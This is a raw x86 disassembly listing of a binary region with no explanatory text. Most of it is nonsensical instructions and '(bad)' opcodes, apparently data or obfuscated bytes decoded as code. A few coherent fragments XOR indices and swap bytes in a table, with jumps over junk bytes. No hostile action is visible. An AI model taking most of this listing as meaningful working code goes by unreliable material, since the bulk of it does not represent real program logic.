  404a21:	imul   DWORD PTR [eax-0x44]
  404a24:	jg     0x4049bc
  404a26:	xchg   DWORD PTR [esi-0x2d838712],edx
  404a2c:	pop    esp
  404a2d:	cmp    bl,BYTE PTR [ebx]
  404a2f:	and    ebp,ebp
  404a31:	daa    
  404a32:	std    
  404a33:	fimul  WORD PTR [edx]
  404a35:	in     al,dx
  404a36:	ss iret 
  404a38:	pop    edi
  404a39:	and    ah,BYTE PTR ds:[ecx]
  404a3c:	inc    ebp
  404a3d:	push   es
  404a3e:	jge    0x404a14
  404a40:	or     DWORD PTR [ecx-0xc],esi
  404a43:	mov    al,ds:0xa60a7cb6
  404a48:	sahf   
  404a49:	stos   DWORD PTR es:[edi],eax
  404a4a:	xchg   edi,eax
  404a4b:	cwde   
  404a4c:	mov    esi,edx
  404a4e:	mov    esp,0x3fac87e7
  404a53:	or     eax,DWORD PTR [edx-0x4d36805]
  404a59:	inc    edx
  404a5a:	pop    ebp
  404a5b:	ret    0xee17
  404a5e:	mov    DWORD PTR [ebx+0x3f832690],ecx
  404a64:	mov    eax,ds:0xce8ea2e3
  404a69:	sub    ebp,ebp
  404a6b:	aas    
  404a6c:	xor    ebp,DWORD PTR [ebx+0x13d01f3a]
  404a72:	cmp    al,0xd1
  404a74:	fcmovbe st,st(0)
  404a76:	cmp    bl,ah
  404a78:	std    
  404a79:	push   edx
  404a7a:	retfw  0x162d
  404a7e:	pop    esp
  404a7f:	xor    DWORD PTR [eax+edi*1-0x250db83a],ebx
  404a86:	call   0xd67af12c
  404a8b:	fs aas 
  404a8d:	fs cwde 
  404a8f:	mov    ebp,0x8e8215e8
  404a94:	imul   eax,DWORD PTR [ecx+0x6d618e7d],0xffffffea
  404a9b:	xor    BYTE PTR [eax+0x4],0x60
  404a9f:	out    0x56,al
  404aa1:	out    dx,eax
  404aa2:	retf   0xd0f2
  404aa5:	cmp    bh,al
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x803c6a28
  404b32:	mov    dl,0xc9
  404b34:	or     esp,DWORD PTR [edx+0x587e7e22]
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b8a
  404b3e:	sub    DWORD PTR [edi-0x25],0x5a4a8f36
  404b45:	inc    eax
  404b46:	fdiv   st,st(2)
  404b48:	dec    esi
  404b49:	push   ecx
  404b4a:	dec    esi
  404b4b:	sbb    BYTE PTR [edx],bl
  404b4d:	je     0x404b23
  404b4f:	addr16 jne 0x404b5f
  404b52:	pop    ebx
  404b53:	ret    0xbb77
  404b56:	or     bh,BYTE PTR [esi+0x47616d1]
  404b5c:	mov    ch,0xe5
  404b5e:	icebp  
  404b5f:	in     eax,dx
  404b60:	std    
  404b61:	xchg   ebx,eax
  404b62:	and    ecx,ebp
  404b64:	ins    DWORD PTR es:[edi],dx
  404b65:	mov    es,WORD PTR [esi-0xf]
  404b68:	cs xchg esi,eax
  404b6a:	inc    edi
  404b6b:	arpl   sp,sp
  404b6d:	xor    BYTE PTR [ecx],ah
  404b6f:	(bad)  
  404b70:	jp     0x404bc5
  404b72:	outs   dx,BYTE PTR ds:[esi]
  404b73:	repz sbb bl,BYTE PTR [bp-0x25]
  404b78:	push   edi
  404b79:	dec    ebx
  404b7a:	loop   0x404bc5
  404b7c:	sbb    edx,DWORD PTR [ebx-0x42]
  404b7f:	mov    cs,WORD PTR [eax]
  404b81:	jns    0x404ba0
  404b83:	push   cs
  404b84:	aad    0x4b
  404b86:	cld    
  404b87:	cli    
  404b88:	jp     0x404b5b
  404b8a:	pop    ebx
  404b8b:	xchg   edi,eax
  404b8c:	shr    DWORD PTR [ebp-0x5d],0x20
  404b90:	aam    0x4b
  404b92:	(bad)  
  404b93:	sbb    eax,0xc693bfa8
  404b98:	loope  0x404c13
  404b9a:	xor    DWORD PTR [edi],ebp
  404b9c:	sub    ebp,DWORD PTR [eax+0x417700c0]
  404ba2:	fwait
  404ba3:	cmp    DWORD PTR [edx-0x585fd9a7],edi
  404ba9:	daa    
  404baa:	mov    eax,0x1ecf2b43
  404baf:	lods   eax,DWORD PTR ds:[esi]
  404bb0:	mov    dh,0x97
  404bb2:	xchg   bl,ah
  404bb4:	cdq    
  404bb5:	mov    dh,0x75
  404bb7:	sub    BYTE PTR [edi],0x47
  404bba:	mov    edx,0xd2e43b26
  404bbf:	dec    edx
  404bc0:	pop    es
  404bc1:	jecxz  0x404ba6
  404bc3:	jo     0x404bc4
  404bc5:	cmp    al,0xf1
  404bc7:	push   ebp
  404bc8:	pop    ecx
  404bc9:	xor    BYTE PTR [edi+edi*1-0xa],al
  404bcd:	jmp    FWORD PTR ds:0x7c9a20ac
  404bd3:	leave  
  404bd4:	shl    BYTE PTR [edi-0x221b58bf],1
  404bda:	cwde   
  404bdb:	pop    esi
  404bdc:	cld    
  404bdd:	mov    dh,0x0
  404bdf:	cmp    al,0x89
  404be1:	or     eax,0xf96dd89d
  404be6:	jl     0x404c08
  404be8:	jno    0x404c62
  404bea:	jle    0x404c5d
  404bec:	idiv   DWORD PTR [ecx]
  404bee:	or     cl,al
  404bf0:	xchg   ebx,eax
  404bf1:	sub    DWORD PTR [ebx-0x6b5220da],edx
  404bf7:	mov    bl,ch
  404bf9:	or     DWORD PTR [esi-0x197020f8],0xfffffff8
  404c00:	dec    ecx
  404c01:	outs   dx,BYTE PTR ds:[esi]
  404c02:	or     eax,0x67bf1ee8
  404c07:	and    al,0xe2
  404c09:	nop
  404c0a:	inc    eax
  404c0b:	je     0x404c83
  404c0d:	mov    ebx,0x624bc279
  404c12:	jmp    0x5a3077de
  404c17:	mov    edx,0x87bf219
  404c1c:	imul   esp,DWORD PTR [esi-0x41],0xaeba6712
  404c23:	imul   ecx,DWORD PTR [ebx+0x1b],0xb1996aae
  404c2a:	xchg   ecx,eax
  404c2b:	push   cs
  404c2c:	cld    
  404c2d:	pop    ebp
  404c2e:	aas    
  404c2f:	push   ebx
  404c30:	xor    dh,ch
  404c32:	hlt    
  404c33:	clc    
  404c34:	sbb    BYTE PTR [edx+0x58],ch
  404c37:	and    esi,DWORD PTR [edi+ecx*4]
  404c3a:	add    al,0x18
  404c3c:	icebp  
  404c3d:	xor    dl,bh
  404c3f:	jnp    0x404cb9
  404c41:	sbb    bh,BYTE PTR [ecx]
  404c43:	mov    ebp,0xe0b09e28
  404c48:	mov    bl,0xa8
  404c4a:	inc    esi
  404c4b:	add    DWORD PTR [edx-0x52],0xe400c686
  404c52:	stos   DWORD PTR es:[edi],eax
  404c53:	adc    eax,0xf0caf351
  404c58:	sti    
  404c59:	xor    BYTE PTR [esi+0x21],bh
  404c5c:	pop    ds
  404c5d:	adc    ch,BYTE PTR [eax]
  404c5f:	sub    esp,eax
  404c61:	mov    dl,0xc7
  404c63:	mov    BYTE PTR [esi-0x80],cl
  404c66:	fcmovnbe st,st(3)
  404c68:	lods   al,BYTE PTR ds:[esi]
  404c69:	push   ebp
  404c6a:	scas   eax,DWORD PTR es:[edi]
  404c6b:	push   ebp
  404c6c:	dec    esi
  404c6d:	mov    ch,BYTE PTR [edx-0x46]
  404c70:	and    eax,0x1e44c54b
  404c75:	repz adc bh,BYTE PTR [edx]
  404c78:	leave  
  404c79:	xor    eax,0xeade0440
  404c7e:	adc    DWORD PTR [edx-0x2c],esp
  404c81:	int3   
  404c82:	mov    ebp,0xdecc2ab3
  404c87:	inc    ecx
  404c88:	or     BYTE PTR [eax-0x5bbc8ed5],dl
  404c8e:	sbb    ah,BYTE PTR [edi+0x9d86cb4]
  404c94:	aam    0x4a
  404c96:	pop    esp
  404c97:	clc    
  404c98:	ror    DWORD PTR [ebx+0x38],1
  404c9b:	xchg   edx,eax
  404c9c:	not    DWORD PTR [edi+0x49]
  404c9f:	mov    esp,0xbc47571
  404ca4:	sbb    ch,bl
  404ca6:	pushf  
  404ca7:	sbb    ecx,DWORD PTR [eax+eax*4-0x752108bc]
  404cae:	imul   ebx,DWORD PTR [edi],0x47
  404cb1:	or     BYTE PTR [eax+0x31],bh
  404cb4:	add    eax,0xa844c05b
  404cb9:	and    BYTE PTR [eax],bl
  404cbb:	dec    esi
  404cbc:	ret    0xee7c
  404cbf:	shl    edi,0xef
  404cc2:	dec    edi
  404cc3:	out    0xaf,eax
  404cc5:	pop    ebx
  404cc6:	jmp    0x404cf8
  404cc8:	add    bh,BYTE PTR [esi+0x5cbec8af]
  404cce:	xchg   ebp,eax
  404ccf:	mov    ebx,0x31e23543
  404cd4:	mov    ds,WORD PTR [esi+0x61eaba66]
  404cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cdb:	push   0x7db36ce7
  404ce0:	aad    0xd3
  404ce2:	test   BYTE PTR [ecx+0x6ae5bd71],bh
  404ce8:	rol    DWORD PTR [edi-0x46],1
  404ceb:	mov    edi,0xe2c35fb8
  404cf0:	push   ebx
  404cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cf2:	sub    DWORD PTR [ebx+eiz*2+0x6d346531],edi
  404cf9:	jle    0x404cd2
  404cfb:	push   es
  404cfc:	out    dx,eax
  404cfd:	xor    DWORD PTR [ebp+esi*1-0x1dc4f35a],esi
  404d04:	mov    dl,0xf
  404d06:	nop
  404d07:	push   es
  404d08:	les    esp,FWORD PTR [ecx+ebp*2-0x2d]
  404d0c:	mov    ebp,0xe2307810
  404d11:	or     ebx,eax
  404d13:	test   DWORD PTR [esi],esp
  404d15:	sbb    dl,BYTE PTR [edx+0x33c84086]
  404d1b:	icebp  
  404d1c:	clc    
  404d1d:	pop    ecx
  404d1e:	icebp  
  404d1f:	sub    ebx,DWORD PTR [edi]
  404d21:	dec    edi
  404d22:	lock cdq 
  404d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d25:	rcl    BYTE PTR [ebx+0x10b5e153],0x71
  404d2c:	popa   
  404d2d:	dec    ebp
  404d2e:	pop    ebx
  404d2f:	dec    ecx
  404d30:	xchg   edi,eax
  404d31:	mov    fs,WORD PTR [edi]
  404d33:	jge    0x404d45
  404d35:	sub    DWORD PTR [ebp+0x1573f30b],esi
  404d3b:	je     0x404d58
  404d3d:	add    DWORD PTR [edi-0x42],0xffffffb8
  404d41:	or     dh,ch
  404d43:	lods   al,BYTE PTR ds:[esi]
  404d44:	jecxz  0x404d05
  404d46:	pop    eax
  404d47:	shl    BYTE PTR [ecx],0x17
  404d4a:	jb     0x404da2
  404d4c:	mov    al,0x6b
  404d4e:	out    0x6a,al
  404d50:	call   0x1d903142
  404d55:	aad    0xaf
  404d57:	popf   
  404d58:	scas   al,BYTE PTR es:[edi]
  404d59:	xlat   BYTE PTR ds:[ebx]
  404d5a:	cld    
  404d5b:	push   eax
  404d5c:	in     eax,0xbf
  404d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d5f:	or     DWORD PTR [eax-0x63],ebp
  404d62:	add    cl,ch
  404d64:	sub    dl,BYTE PTR [ebx]
  404d66:	cdq    
  404d67:	inc    eax
  404d68:	cmc    
  404d69:	div    DWORD PTR [ebp+0x24]
  404d6c:	or     eax,0x4b4d0c65
  404d71:	pop    ebx
  404d72:	inc    ecx
  404d73:	add    eax,0x3c111077
  404d78:	dec    esi
  404d79:	shl    cl,0xe2
  404d7c:	mul    DWORD PTR [esi+0x10b42265]
  404d82:	inc    esp
  404d83:	jge    0x404d4a
  404d85:	push   cs
  404d86:	pop    edx
  404d87:	dec    edi
  404d88:	and    BYTE PTR [edi-0x52],ah
  404d8b:	mov    BYTE PTR [esi-0x35],al
  404d8e:	jg     0x404d3c
  404d90:	push   ebx
  404d91:	loopne 0x404de0
  404d93:	or     ebx,DWORD PTR [ebx]
  404d95:	or     al,0x89
  404d97:	mov    es,WORD PTR ds:0x7271e952
  404d9d:	mov    bh,0x94
  404d9f:	or     bh,BYTE PTR [eax-0x3b0d8b72]
  404da5:	pushf  
  404da6:	in     eax,0xe9
  404da8:	jnp    0x404e07
  404daa:	lds    edx,FWORD PTR [ebx+0x16]
  404dad:	aaa    
  404dae:	and    ebx,DWORD PTR [ebx+edi*4-0x11b9850c]
  404db5:	jmp    0x4302:0x84041d89
  404dbc:	out    0x2b,eax
  404dbe:	cmp    edi,eax
  404dc0:	mov    dl,0x12
  404dc2:	adc    DWORD PTR [esi],0xffffffb3
  404dc5:	js     0x404d4c
  404dc7:	mov    esp,0x42dd85d7
  404dcc:	jb     0x404ddc
  404dce:	(bad)  
  404dcf:	and    esp,ebx
  404dd1:	jnp    0x404d61
  404dd3:	fs inc ebx
  404dd5:	cli    
  404dd6:	adc    BYTE PTR [edx],bh
  404dd8:	and    esp,DWORD PTR [edx+0x66]
  404ddb:	mov    dh,0xd8
  404ddd:	jp     0x404d85
  404ddf:	cli    
  404de0:	xchg   edi,eax
  404de1:	cmp    al,0x7f
  404de3:	enter  0x4e61,0xa
  404de7:	daa    
  404de8:	pop    es
  404de9:	ss xchg ebx,eax
  404deb:	pop    esp
  404dec:	clc    
  404ded:	jp     0x404de4
  404def:	xchg   edi,eax
  404df0:	das    
  404df1:	sub    ah,BYTE PTR [eax+0x673afaaf]
  404df7:	push   es
  404df8:	mov    ebp,0x42cb53b7
  404dfd:	loop   0x404e7b
  404dff:	adc    DWORD PTR [edx+eiz*4+0x664ecd9e],0xffffffd9
  404e07:	stos   DWORD PTR es:[edi],eax
  404e08:	lods   eax,DWORD PTR ds:[esi]
  404e09:	loop   0x404e5e
  404e0b:	jae    0x404d9a
  404e0d:	sub    BYTE PTR [esp+edi*4+0x3b],0xe7
  404e12:	std    
  404e13:	shl    DWORD PTR [esi+0x51],1
  404e16:	(bad)  
  404e17:	push   edi
  404e18:	inc    esp
  404e19:	outs   dx,DWORD PTR ds:[esi]
  404e1a:	cmp    eax,0xd6ca3ec6
  404e1f:	call   0xff9:0x32ff0df
  404e26:	scas   eax,DWORD PTR es:[edi]
  404e27:	xlat   BYTE PTR ds:[ebx]
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404de2
  404e5e:	mov    edx,0x218c7be7
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e9d
  404e6a:	xor    BYTE PTR [ebp+0xa0a6bd6],al
  404e70:	test   DWORD PTR [bp+si-0xfc5],0x1994cd73
  404e79:	or     ebp,DWORD PTR [eax]
  404e7b:	pop    esi
  404e7c:	hlt    
  404e7d:	les    esp,FWORD PTR [edx-0x4a89ff53]
  404e83:	add    esp,0xffffffa9
  404e86:	inc    ebx
  404e87:	adc    DWORD PTR [ebp-0x33],edi
  404e8a:	cmp    BYTE PTR [edi+0x3f7cfcc2],cl
  404e90:	jo     0x404eef
  404e92:	repnz les si,DWORD PTR [ecx]
  404e96:	dec    ecx
  404e97:	outs   dx,DWORD PTR ds:[esi]
  404e98:	imul   ebx,esi,0x5d2123e5
  404e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e9f:	cmp    edx,DWORD PTR [edx-0x3c2f081f]
  404ea5:	ret    
  404ea6:	fucom  st(0)
  404ea8:	push   ecx
  404ea9:	sbb    eax,0x3331cb96
  404eae:	pop    ss
  404eaf:	sbb    al,0xa0
  404eb1:	ins    DWORD PTR es:[edi],dx
  404eb2:	je     0x404f1f
  404eb4:	(bad)  
  404eb5:	sti    
  404eb6:	fiadd  DWORD PTR [eax]
  404eb8:	mov    al,0x11
  404eba:	xlat   BYTE PTR ds:[ebx]
  404ebb:	pusha  
  404ebc:	inc    esi
  404ebd:	cwde   
  404ebe:	ins    DWORD PTR es:[edi],dx
  404ebf:	stc    
  404ec0:	fiadd  DWORD PTR [edi-0x67]
  404ec3:	aam    0xa1
  404ec5:	sbb    eax,0xeecba33d
  404eca:	sbb    esi,DWORD PTR [edx+ebp*1+0x57]
  404ece:	ss jp  0x404f40
  404ed1:	retf   
  404ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ed3:	push   cs
  404ed4:	icebp  
  404ed5:	(bad)  
  404ed6:	push   eax
  404ed7:	dec    ebx
  404ed8:	adc    DWORD PTR [ecx-0x4d],ebx
  404edb:	pop    esi
  404edc:	pop    esp
  404edd:	adc    DWORD PTR ds:0x3c66b634,0xe4d8f62e
  404ee7:	jmp    0x6c34:0xe85d8c3d
  404eee:	mov    ecx,0x48013b29
  404ef4:	mov    eax,esi
  404ef6:	ds cwde 
  404ef8:	or     dh,ch
  404efa:	add    DWORD PTR [eax+0xd],0x65
  404efe:	sbb    ebp,esp
  404f00:	adc    eax,0xf61d20d9
  404f05:	loop   0x404e94
  404f07:	jecxz  0x404eb7
  404f09:	das    
  404f0a:	jmp    0xea89b127
  404f0f:	push   0xe2142ab0
  404f14:	xchg   edx,eax
  404f15:	or     al,0xc0
  404f17:	loop   0x404eb5
  404f19:	add    DWORD PTR ds:0xe29d0e9b,eax
  404f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f20:	imul   ebp,DWORD PTR [edx-0x1dc81d6c],0x1e159e6b
  404f2a:	dec    ebx
  404f2b:	les    ebx,FWORD PTR [ebx+0x3b142821]
  404f31:	scas   al,BYTE PTR es:[edi]
  404f32:	mov    ch,0xf4
  404f34:	fsubr  st(2),st
  404f36:	mov    eax,ds:0xa04dfad9
  404f3b:	xchg   DWORD PTR [ebp+0x2c],esp
  404f3e:	mov    esi,0x9eb02173
  404f43:	or     edi,DWORD PTR [esi+0x35bcaaf7]
  404f49:	fbstp  TBYTE PTR [edx+edi*4-0x5f]
  404f4d:	ficomp DWORD PTR [edi]
  404f4f:	fs je  0x404f9a
  404f52:	shl    BYTE PTR [edx],cl
  404f54:	loop   0x404f6d
  404f56:	enter  0x2519,0xb2
  404f5a:	dec    esp
  404f5b:	fadd   QWORD PTR ds:0x742a5404
  404f61:	pop    edi
  404f62:	test   eax,0xf5b59ea1
  404f67:	sbb    dh,cl
  404f69:	pop    esp
  404f6a:	mov    eax,0x92037b1e
  404f6f:	dec    ebx
  404f70:	jmp    0x3e7a:0xb230138a
  404f77:	fucomp st(0)
  404f79:	xor    eax,0x6bd4075a
  404f7e:	jnp    0x404f73
  404f80:	sbb    DWORD PTR [ebp+0x3b4f97ba],edi
  404f86:	(bad)  
  404f87:	std    
  404f88:	test   al,0x6a
  404f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f8b:	sub    al,0x94
  404f8d:	jle    0x404f45
  404f8f:	bound  esp,QWORD PTR [ebp+0x3209abd]
  404f95:	jns    0x404fcb
  404f97:	cmc    
  404f98:	sub    al,0xd5
  404f9a:	adc    BYTE PTR [ebp-0x1ed928e9],ch
  404fa0:	or     cl,BYTE PTR [edi+0x5dd52061]
  404fa6:	cdq    
  404fa7:	daa    
  404fa8:	rcl    BYTE PTR [edx+0xf],cl
  404fab:	dec    edi
  404fac:	sti    
  404fad:	and    BYTE PTR [eax-0x70],al
  404fb0:	pop    es
  404fb1:	test   eax,0x39d9ffc9
  404fb6:	cmp    eax,0xb9f2ef75
  404fbb:	outs   dx,DWORD PTR ds:[esi]
  404fbc:	cli    
  404fbd:	out    dx,al
  404fbe:	js     0x404f63
  404fc0:	stos   DWORD PTR es:[edi],eax
  404fc1:	xchg   ebp,eax
  404fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fc3:	xor    al,0x86
  404fc5:	in     eax,0x38
  404fc7:	lods   eax,DWORD PTR ds:[esi]
  404fc8:	das    
  404fc9:	push   es
  404fca:	add    bh,ch
  404fcc:	scas   eax,DWORD PTR es:[edi]
  404fcd:	les    eax,FWORD PTR [ebx+0x51]
  404fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fd1:	leave  
  404fd2:	xchg   edi,eax
  404fd3:	test   al,0x79
  404fd5:	shrd   ebp,ebx,0x18
  404fd9:	clc    
  404fda:	popf   
  404fdb:	and    cl,BYTE PTR [ebx+ebp*4+0x7b43d7bb]
  404fe2:	push   ds
  404fe3:	push   ebp
  404fe4:	xchg   edx,eax
  404fe5:	pop    ebx
  404fe6:	enter  0xcfdd,0xa9
  404fea:	in     al,dx
  404feb:	leave  
  404fec:	fld    TBYTE PTR [edi]
  404fee:	mov    bl,0x9
  404ff0:	xchg   ebx,eax
  404ff1:	mov    DWORD PTR [ecx],ebx
  404ff3:	xchg   ebx,eax
  404ff4:	xlat   BYTE PTR ds:[ebx]
  404ff5:	aad    0x13
  404ff7:	mov    edx,0x16a1efc1
  404ffc:	push   esi
  404ffd:	icebp  
  404ffe:	retf   
  404fff:	and    ch,bh
  405001:	scas   eax,DWORD PTR es:[edi]
  405002:	xor    ecx,DWORD PTR [ebp-0x7e]
  405005:	iret   
  405006:	push   0x3322382
  40500b:	inc    ecx
  40500c:	test   eax,0xb57055b0
  405011:	sub    BYTE PTR [ecx+0x3ef3fefa],al
  405017:	cmp    ch,bl
  405019:	inc    edx
  40501a:	sub    al,0x63
  40501c:	aas    
  40501d:	xchg   esi,eax
  40501e:	xor    esi,DWORD PTR [ebx+0x74a57195]
  405024:	mov    ds:0x6cd53c3d,eax
  405029:	out    dx,al
  40502a:	loopne 0x405073
  40502c:	xchg   ebx,eax
  40502d:	dec    ecx
  40502e:	ds push ds
  405030:	test   ch,0x9f
  405033:	fadd   QWORD PTR [edi+0x18a2c79c]
  405039:	test   ebp,esi
  40503b:	and    ebx,DWORD PTR [edx+0x40]
  40503e:	mov    ds:0xcdf3d433,eax
  405043:	cmp    cl,bh
  405045:	out    dx,eax
  405046:	fcom   QWORD PTR [ebx+0x4d203f46]
  40504c:	inc    ebp
  40504d:	jl     0x404fe2
  40504f:	dec    ecx
  405050:	leave  
  405051:	call   FWORD PTR [ecx-0x69]
  405054:	int3   
  405055:	add    eax,0xd0f00d4c
  40505a:	bound  esi,QWORD PTR [edx+0x2cad21cf]
  405060:	mov    ds:0x3a42ae05,al
  405065:	xlat   BYTE PTR ds:[ebx]
  405066:	adc    dh,BYTE PTR [ecx-0x53dd26dc]
  40506c:	aas    
  40506d:	jo     0x4050a2
  40506f:	inc    edx
  405070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405071:	mov    WORD PTR [esi+0x41076625],es
  405077:	mov    al,0x9
  405079:	stc    
  40507a:	jmp    0x40505f
  40507c:	cmp    al,0xfa
  40507e:	mov    esp,0xa181d523
  405083:	mov    BYTE PTR [ebx],bh
  405085:	inc    ch
  405087:	lock fisubr WORD PTR [esi-0x6e8193d5]
  40508e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40508f:	dec    esi
  405090:	stc    
  405091:	and    ebp,DWORD PTR [ecx]
  405093:	xlat   BYTE PTR ds:[ebx]
  405094:	in     eax,0xbf
  405096:	addr16 test eax,0x19dd6028
  40509c:	ins    BYTE PTR es:[edi],dx
  40509d:	cmc    
  40509e:	or     BYTE PTR [ecx-0x40175a1],ch
  4050a4:	cmp    DWORD PTR [eax],esp
  4050a6:	mov    dl,0x23
  4050a8:	call   0x2dfc:0xf233f6a1
  4050af:	cmp    eax,0xde023bd
  4050b4:	fwait
  4050b5:	xchg   ebp,eax
  4050b6:	lock adc al,0x2c
  4050b9:	mov    al,0xd
  4050bb:	pop    edx
  4050bc:	adc    eax,0xce68fba4
  4050c1:	push   ebp
  4050c2:	mov    ah,0x3
  4050c4:	push   es
  4050c5:	pop    ebp
  4050c6:	enter  0xf211,0x52
  4050ca:	mov    al,0x34
  4050cc:	(bad)  
  4050cd:	pop    esp
  4050ce:	mov    ebx,0x28470821
  4050d3:	aas    
  4050d4:	aad    0xc0
  4050d6:	jae    0x4050be
  4050d8:	(bad)  
  4050d9:	sub    ch,cl
  4050db:	aam    0x83
  4050dd:	(bad)  
  4050df:	ds addr16 js 0x4050c4
  4050e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050e4:	pop    ebp
  4050e5:	xchg   BYTE PTR [ecx-0x5c],cl
  4050e8:	les    esi,FWORD PTR [eax+0x42]
  4050eb:	mov    ebx,0x1472b774
  4050f0:	int    0x8f
  4050f2:	mov    al,0x43
  4050f4:	pop    edx
  4050f5:	push   ecx
  4050f6:	and    BYTE PTR [esi-0x1a9c2f16],cl
  4050fc:	xor    ah,dh
  4050fe:	out    dx,al
  4050ff:	jmp    0xc6badb17
  405104:	out    dx,al
  405105:	je     0x4050f2
  405107:	sbb    eax,0x7743a0ee
  40510c:	sub    BYTE PTR [ecx-0x638f7be1],bh
  405112:	mov    WORD PTR [ebp-0x19837b65],gs
  405118:	(bad)  
  405119:	retf   
  40511a:	stos   BYTE PTR es:[edi],al
  40511b:	(bad)  
  40511e:	ss inc ebp
  405120:	xor    DWORD PTR [ecx],ebx
  405122:	aaa    
  405123:	jb     0x40513d
  405125:	xchg   dl,cl
  405127:	mov    esp,0x57ad74fa
  40512c:	mov    ebx,0xef40e6b8
  405131:	mul    cl
  405133:	aad    0x7f
  405135:	out    dx,al
  405136:	jbe    0x40517e
  405138:	call   0x3796:0xe64fcc3e
  40513f:	inc    esp
  405140:	sbb    cl,BYTE PTR [eax]
  405142:	push   ss
  405143:	jmp    DWORD PTR [ecx]
  405145:	mov    al,0x81
  405147:	cdq    
  405148:	fistp  DWORD PTR [edi]
  40514a:	inc    edx
  40514b:	adc    BYTE PTR [eax],dh
  40514d:	add    DWORD PTR [edx-0x740450f1],edx
  405153:	pop    ebp
  405154:	call   0xd16c298c
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	sub    eax,0xf6849694
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x40519a
  40517e:	cdq    
  40517f:	pop    edx
  405180:	ja     0x4051f3
  405182:	jae    0x4051e0
  405184:	mov    WORD PTR [edx+0x13],es
  405187:	pop    ds
  405188:	ret    0xa67e
  40518b:	ret    
  40518c:	loopne 0x405129
  40518e:	cmc    
  40518f:	push   ebp
  405190:	fsubr  QWORD PTR [esp+eiz*4+0x22]
  405194:	xchg   esi,eax
  405195:	loop   0x4051c0
  405197:	mov    eax,0xa63ec8e7
  40519c:	scas   eax,DWORD PTR es:[edi]
  40519d:	inc    esp
  40519e:	add    al,BYTE PTR [esi]
  4051a0:	(bad)  
  4051a1:	and    ecx,DWORD PTR [ecx-0x16ccf1a8]
  4051a7:	push   edi
  4051a8:	lahf   
  4051a9:	add    al,0x87
  4051ab:	cdq    
  4051ac:	add    ebp,esp
  4051ae:	inc    esi
  4051af:	sbb    DWORD PTR [edx],0x4d0c705b
  4051b5:	rcr    DWORD PTR [esi+0x6],1
  4051b8:	jns    0x405222
  4051ba:	inc    edx
  4051bb:	sbb    dh,BYTE PTR [ecx-0x29]
  4051be:	scas   eax,DWORD PTR es:[edi]
  4051bf:	enter  0x9aa4,0x96
  4051c3:	sbb    al,0x3d
